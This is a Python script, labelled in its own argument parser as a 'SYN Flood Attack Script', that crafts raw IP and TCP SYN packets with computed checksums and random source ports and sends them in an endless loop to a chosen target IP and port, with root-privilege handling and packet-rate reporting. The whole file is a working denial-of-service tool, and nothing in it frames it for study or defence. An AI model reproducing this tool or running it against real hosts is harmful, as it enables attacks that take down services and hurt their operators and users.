import socket
import random
import struct
import time
import sys
import argparse

def checksum(msg):
    """Calculate the checksum of the given message"""
    if len(msg) % 2 == 1:
        msg += b'\0'
    
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i + 1]
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def get_source_ip():
    """Get the local machine's IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        source_ip = s.getsockname()[0]
        return source_ip
    except Exception as e:
        print(f"Could not determine source IP: {e}")
        return "127.0.0.1"  # Default to localhost
    finally:
        s.close()

def create_syn_packet(source_ip, source_port, dest_ip, dest_port):
    """Create a raw TCP SYN packet with proper IP and TCP headers"""
    seq_number = random.randint(0, 4294967295)
    
    # IP Header
    ip_ver_ihl = (4 << 4) + 5
    ip_dscp_ecn = 0
    ip_tot_len = 40
    ip_id = random.randint(1, 65535)
    ip_flags_offset = 0
    ip_ttl = 64
    ip_protocol = socket.IPPROTO_TCP
    ip_checksum = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_flags_offset,
        ip_ttl, ip_protocol, ip_checksum, ip_saddr, ip_daddr)
    
    ip_checksum = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_dscp_ecn, ip_tot_len, ip_id, ip_flags_offset,
        ip_ttl, ip_protocol, ip_checksum, ip_saddr, ip_daddr)
    
    # TCP Header
    tcp_sport = source_port
    tcp_dport = dest_port
    tcp_seq = seq_number
    tcp_ack_seq = 0
    tcp_data_offset = (5 << 4)
    tcp_flags = 2  # SYN flag
    tcp_window = 64240
    tcp_checksum = 0
    tcp_urgptr = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_sport, tcp_dport, tcp_seq, tcp_ack_seq,
        tcp_data_offset, tcp_flags, tcp_window, tcp_checksum, tcp_urgptr)
    
    pseudo_header = struct.pack('!4s4sBBH',
        socket.inet_aton(source_ip), socket.inet_aton(dest_ip),
        0, socket.IPPROTO_TCP, len(tcp_header))
    
    tcp_checksum = checksum(pseudo_header + tcp_header)
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_sport, tcp_dport, tcp_seq, tcp_ack_seq,
        tcp_data_offset, tcp_flags, tcp_window, tcp_checksum, tcp_urgptr)
    
    return ip_header + tcp_header

def main():
    if not sys.platform.startswith('linux'):
        print("This script is designed to run on Linux. Other platforms may require modifications.")
    
    parser = argparse.ArgumentParser(description="SYN Flood Attack Script")
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--source", help="Source IP address (default: auto-detect)")
    parser.add_argument("-i", "--interval", type=int, default=1000, help="Reporting interval in packets (default: 1000)")
    args = parser.parse_args()
    
    source_ip = args.source if args.source else get_source_ip()
    print(f"Using source IP: {source_ip}")
    
    target_ip = args.target if args.target else "192.168.1.1"
    target_port = args.port
    print(f"Using target IP: {target_ip}:{target_port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("Error: This script requires root privileges.")
        print("Please run it with 'sudo python3 script.py'")
        sys.exit(1)
    
    print(f"Starting SYN flood attack on {target_ip}:{target_port}...")
    print("Press Ctrl+C to stop the attack")
    
    packets_sent = 0
    start_time = time.time()
    report_interval = args.interval
    
    try:
        while True:
            try:
                source_port = random.randint(1024, 65535)
                packet = create_syn_packet(source_ip, source_port, target_ip, target_port)
                sock.sendto(packet, (target_ip, 0))
                
                packets_sent += 1
                if packets_sent % report_interval == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    print(f"Sent {packets_sent} packets ({rate:.2f} packets/sec)")
                
            except Exception as e:
                print(f"Failed to send SYN packet: {e}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        rate = packets_sent / elapsed if elapsed > 0 else 0
        print(f"\nAttack stopped. Sent {packets_sent} packets in {elapsed:.2f} seconds ({rate:.2f} packets/sec)")
        sys.exit(0)

if __name__ == "__main__":
    main()
